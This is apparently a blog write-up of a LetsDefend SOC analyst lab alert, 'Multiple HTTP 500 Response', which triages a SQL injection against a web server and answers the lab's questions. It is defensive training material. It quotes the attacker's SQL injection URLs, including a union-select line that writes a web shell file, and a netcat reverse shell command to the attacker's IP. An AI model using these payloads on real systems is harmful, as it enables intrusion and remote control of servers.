---
title: "LetsDefend SOC142 - Multiple HTTP 500 Response"
date: 2022-02-28 10:21 +0800
categories: [LetsDefend, Soc Analyst]
tags: [SOC, Code Execution]
author: CEngover
---

### Event Details

**EventID:**  89

**Event Time:** April 18, 2021, 1 p.m.

**Rule:** SOC142 - Multiple HTTP 500 Response

**Level:** Security Analyst

**Source Address** : 101.32.223.119

**Source Hostname** : 101.32.223.119

**Destination Address** : 172.16.20.6

**Destination Hostname** : SQLServer

**Username** : www-data

**Request URL** : https://172.16.20.6/userNumber=1 AND (SELECT * FROM Users) = 1

**User Agent** : Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36

**Device Action** : Allowed

After checking logs that belong to source IP, we can see that there are several SQL Injection attack to the destination address. By viewing all of these logs, we notice that attacker had made an attack succesfully. What I mean is the attacker uploaded a web shell into system. The requested URL is `**Request URL:** https://172.16.20.6/userNumber=' union select 1, '' into outfile '/var/www/html/cmd.php' #`

By checking the IP address is malicious or not, Virustotal returns the IP is `malicious` by several security vendors. Let's answer the following questions.

-   When was it accessed?
	`Apr, 18, 2021, 01:01 PM`
	
-   What is the source address?
	`101.32.223.119`
	
-   What is the destination address?
	`172.16.20.6`

-   Which user tried to access?
	`www-data`

-   What is User Agent?
	`Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36`

-   Is the request blocked?
	`Nope`

In Endpoint section, we can see that the attacker could execute system commands such as whoami, id, etc. After code execution, the attack get  connection via `nc 101.32.223.119 -e /bin/sh` command. 